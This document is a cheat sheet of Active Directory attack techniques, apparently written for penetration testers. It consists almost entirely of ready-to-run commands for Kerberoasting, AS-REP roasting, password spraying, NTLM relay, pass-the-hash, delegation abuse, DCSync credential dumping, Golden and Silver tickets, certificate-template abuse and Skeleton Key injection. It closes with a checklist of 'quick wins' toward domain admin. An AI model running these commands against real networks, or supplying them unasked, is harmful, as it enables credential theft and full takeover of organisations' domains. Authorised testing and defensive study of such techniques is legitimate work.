# Active Directory Attack Methodology

## Enumeration
```bash
# BloodHound collection
SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp
bloodhound-python -u user -p 'pass' -d domain.local -ns <DC_IP> -c All
# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Get-DomainGroup -AdminCount | Select cn
Get-DomainComputer -Unconstrained | Select dnshostname
Find-DomainShare -CheckShareAccess
# ldapsearch
ldapsearch -x -H ldap://<DC> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
# enum4linux-ng
enum4linux-ng -A <DC_IP>
# kerbrute user enumeration
kerbrute userenum --dc <DC_IP> -d domain.local users.txt
```

## AS-REP Roasting (No Pre-Auth)
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```
Find targets: `Get-DomainUser -PreauthNotRequired | Select samaccountname`

## Kerberoasting
```bash
GetUserSPNs.py domain.local/user:'pass' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt
```
```powershell
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
# Target specific high-priv SPN
Rubeus.exe kerberoast /user:svc_admin /outfile:svc.txt
```

## Password Spraying
```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Spring2024!' --no-bruteforce --continue-on-success
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Spring2024!'
spray.sh -smb <DC_IP> users.txt 'Spring2024!' 1 35 <domain>
```
Respect lockout: `net accounts /domain` — check threshold and observation window, stay 1 attempt per window.

## NTLM Relay
```bash
# Responder for hash capture (LLMNR/NBT-NS/mDNS)
responder -I eth0 -dwPv
# ntlmrelayx to target SMB signing disabled hosts
ntlmrelayx.py -tf targets.txt -smb2support -i
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
# mitm6 for IPv6 DNS takeover → NTLM relay to LDAP
mitm6 -d domain.local
ntlmrelayx.py -6 -t ldaps://<DC_IP> --delegate-access
```

## Lateral Movement
```bash
# Pass-the-Hash
crackmapexec smb <targets> -u admin -H <NTLM_hash> -x 'whoami'
psexec.py domain.local/admin@<target> -hashes :<NTLM_hash>
wmiexec.py domain.local/admin@<target> -hashes :<NTLM_hash>
atexec.py domain.local/admin@<target> -hashes :<NTLM_hash> 'whoami'
smbexec.py domain.local/admin@<target> -hashes :<NTLM_hash>
evil-winrm -i <target> -u admin -H <NTLM_hash>
# Pass-the-Ticket
Rubeus.exe ptt /ticket:<base64_ticket>
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py domain.local/admin@<target> -k -no-pass
# RDP with restricted admin (PtH)
xfreerdp /v:<target> /u:admin /pth:<NTLM_hash> /cert-ignore
```

## Delegation Abuse
```bash
# Unconstrained Delegation — capture TGTs
Rubeus.exe monitor /interval:5 /nowrap
# Force auth from DC via SpoolSample/Printerbug
SpoolSample.exe <DC> <unconstrained_host>
# Constrained Delegation — S4U2self + S4U2proxy
getST.py -spn cifs/<target> -impersonate administrator domain.local/svc_account:'pass' -dc-ip <DC_IP>
Rubeus.exe s4u /user:svc_account /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt
# Resource-Based Constrained Delegation
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' -dc-ip <DC_IP> domain.local/user:'pass'
rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -dc-ip <DC_IP> -action write domain.local/user:'pass'
getST.py -spn cifs/TARGET.domain.local -impersonate administrator domain.local/'EVIL$':'P@ss' -dc-ip <DC_IP>
```

## DCSync
```bash
secretsdump.py domain.local/admin:'pass'@<DC_IP> -just-dc-ntlm
secretsdump.py domain.local/admin@<DC_IP> -hashes :<NTLM_hash> -just-dc-user krbtgt
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
```

## Domain Dominance
```bash
# Golden Ticket (requires krbtgt hash + domain SID)
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local administrator
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:<SID> /krbtgt:<hash> /ptt"
# Silver Ticket (service-specific, harder to detect)
ticketer.py -nthash <service_hash> -domain-sid <SID> -domain domain.local -spn cifs/<target> administrator
# ADCS abuse (Certipy)
certipy find -u user@domain.local -p 'pass' -dc-ip <DC_IP> -vulnerable
certipy req -u user@domain.local -p 'pass' -ca YOURCA -target <CA_HOST> -template ESC1Template -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# Skeleton Key (in-memory on DC — injects master password)
mimikatz.exe "misc::skeleton"
# Then authenticate as any user with password "mimikatz"
```

## Trust Abuse
```bash
# Cross-forest with SID History
Get-DomainTrust
Get-DomainSID -Domain child.domain.local
ticketer.py -nthash <trust_key> -domain-sid <child_SID> -domain child.domain.local -extra-sid <parent_SID>-519 administrator
```

## Quick Wins Checklist
1. Kerberoast all SPNs — any crackable hash = lateral movement
2. AS-REP roast accounts with no pre-auth
3. Spray `Season+Year!` pattern against all users (respect lockout)
4. Responder + ntlmrelayx on networks with SMB signing disabled
5. Check for unconstrained delegation hosts — coerce DC auth
6. ADCS ESC1-ESC8 misconfigured templates = instant DA
7. BloodHound shortest path to Domain Admins — follow the graph
